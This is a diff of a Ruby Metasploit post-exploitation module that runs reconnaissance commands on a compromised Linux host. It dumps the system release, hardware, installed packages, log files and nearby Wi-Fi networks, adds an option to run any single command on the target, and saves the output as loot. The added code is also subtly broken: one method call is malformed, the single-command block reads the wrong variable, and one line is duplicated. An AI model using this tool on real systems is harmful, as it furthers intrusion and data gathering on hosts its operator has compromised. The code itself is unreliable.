@@ -63,7 +63,7 @@
 
 
 #
-# Module Dependencies/requires
+# Metasploit Module librarys to load ..
 #
 require 'rex'
 require 'msf/core'
@@ -72,7 +72,7 @@ require 'msf/core/post/common'
 
 
 #
-# Metasploit Class name and includes
+# Metasploit Class name and mixins ..
 #
 class MetasploitModule < Msf::Post
       Rank = ExcellentRanking
@@ -84,6 +84,7 @@ class MetasploitModule < Msf::Post
 
 
 #
+# The 'def initialize()' funtion ..
 # Building Metasploit/Armitage info GUI/CLI
 #
         def initialize(info={})
@@ -138,8 +139,8 @@ class MetasploitModule < Msf::Post
 
 
 #
-# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
-# Running sellected modules against session target
+# The 'def run()' funtion ..
+# Running sellected modules against session target.
 #
 def run
   session = client
@@ -204,11 +205,14 @@ def run
       # Dump system information from target system (fingerprints)
       #
       data_dump=''
-      print_status("Executing list of commands remotlly ..")
-      # bash commands to be executed remotlly ..
+      print_status("Executing list of commands remotelly ..")
+      Rex::sleep(0.5)
+      # bash commands to be executed remotelly ..
       date_out = cmd_exec("date")
       distro_uname = cmd_exec("uname -a")
       distro_release = cmd_exec("cat /etc/*-release | grep \"DISTRIB_RELEASE=\"; cat /etc/*-release | grep \"DISTRIB_DESCRIPTION=\"; cat /etc/*-release | grep \"VERSION_ID=\"; cat /etc/*-release | grep \"ID_LIKE=\"")
+      distro_hardw = cmd_exec("lscpu | grep \"Architecture\"; lscpu | grep \"CPU op-mode\"; lscpu | grep \"Vendor ID\"")
+      distro_shells = cmd_exec("cat /etc/shells")
       distro_shells = cmd_exec("cat /etc/shells")
       # store data into a variable to write the logfile ..
       data_dump << date_out
@@ -221,32 +225,68 @@ def run
       data_dump << "----------------"
       data_dump << distro_release
       data_dump << ""
+      data_dump << "HARDWARE INFO:"
+      data_dump << "----------------"
+      data_dump << distro_hardw
+      data_dump << ""
       data_dump << "AVAILABLE SHELLS:"
       data_dump << "----------------"
       data_dump << distro_shells
       data_dump << ""
-      Rex::sleep(1.0)
+      Rex::sleep(0.5)
 
         #
         # Agressive scan results ..
         #
         if datastore['AGRESSIVE_DUMP'] == true
+          print_status("Running aggressive fingerprint modules ..")
+          Rex::sleep(0.5)
+          # bash commands to be executed remotelly ..
+          distro_packages = cmd_exec("/usr/bin/dpkg -l")
+          distro_logs = cmd_exec("find /var/log -type f -perm -4")
           # Store interface in use (remote)
           interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
           # Executing interface scans (essids emitting)
           essid_out = cmd_exec("sudo iwlist #{interface} scanning | grep ESSID:")
           Rex::sleep(0.5)
           # store data into an variable to write the logfile ..
+          data_dump << "LIST OF LOGFILES FOUND:"
+          data_dump << "-----------------------"
+          data_dump << distro_logs
+          data_dump << ""
+          data_dump << "LIST OF PACKAGES FOUND:"
+          data_dump << "-----------------------"
+          data_dump << distro_packages
+          data_dump << ""
           data_dump << "LIST OF ESSIDs EMITING:"
           data_dump << "-----------------------"
           data_dump << essid_out
           data_dump << ""
         end
 
+        #
+        # Single_command to execute remotelly ..
+        #
+        if not datastore['SINGLE_COMMAND'].nil
+          print_status("Running a single bash command ..")
+          Rex::sleep(0.5)
+          # bash commands to be executed remotelly ..
+          store_comm = datastore['SINGLE_COMMAND']
+          single_comm = cmd_exec("#{single_comm}")
+          Rex::sleep(0.5)
+          # store data into an variable to write the logfile ..
+          data_dump << "SINGLE COMMAND EXECUTED:"
+          data_dump << "-----------------------"
+          data_dump << single_comm
+          data_dump << ""
+        end
+
           #
           # Display results on screen ..
           #
+          print_good("Remote scans completed, building list ..")
           print_line("")
+          Rex::sleep(1.0)
           print_line(data_dump)
           print_line("")
           Rex::sleep(0.5)
@@ -255,9 +295,14 @@ def run
      # Store data into msf loot folder (local) ..
      #
      if datastore['STORE_LOOT'] == true
-       print_warning("Fingerprints stored in: ~/.msf4/loot (folder) ..")
-       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "output of linux_hostrecon")
+       print_warning("Fingerprints stored under: ~/.msf4/loot (folder) ..")
+       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
      end
-
+   #
+   # end of the 'def run()' funtion ..
+   #
    end
+#
+# exit module execution ..
+#
 end
